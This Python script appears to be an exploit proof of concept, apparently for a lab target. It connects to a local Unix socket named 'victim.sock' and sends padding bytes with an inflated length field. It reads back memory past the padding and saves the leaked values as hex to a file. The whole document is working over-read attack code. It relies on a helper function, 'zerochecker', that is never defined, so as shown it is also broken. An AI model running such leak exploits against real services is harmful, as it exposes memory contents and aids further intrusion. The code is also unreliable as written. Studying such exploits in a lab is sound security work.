import socket
import sys
from os.path import expanduser

# Create a UDS socket
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
home = expanduser("~")
server_address = home + '/victim.sock'
print('connecting to {}'.format(server_address))
try:
    sock.connect(server_address)
except socket.error as msg:
    print(msg)
    sys.exit(1)

try:

    fo = open("leaked_data.txt", "a")

    # Send data
    message = b'AAAAAAAAAAAAAAAAAAAAAAAA\n32\n'
    print('sending {!r}'.format(message))
    sock.sendall(message)

    amount_received = 0
    amount_expected = len(message)

    while amount_received < amount_expected:
        data = sock.recv(32)
        amount_received += len(data)
        print(zerochecker(hex(int.from_bytes(data[24:],"little")),18))
        fo.write(zerochecker(hex(int.from_bytes(data[24:],"little")),18))

finally:
    print('closing socket')
    fo.close()
    sock.close()
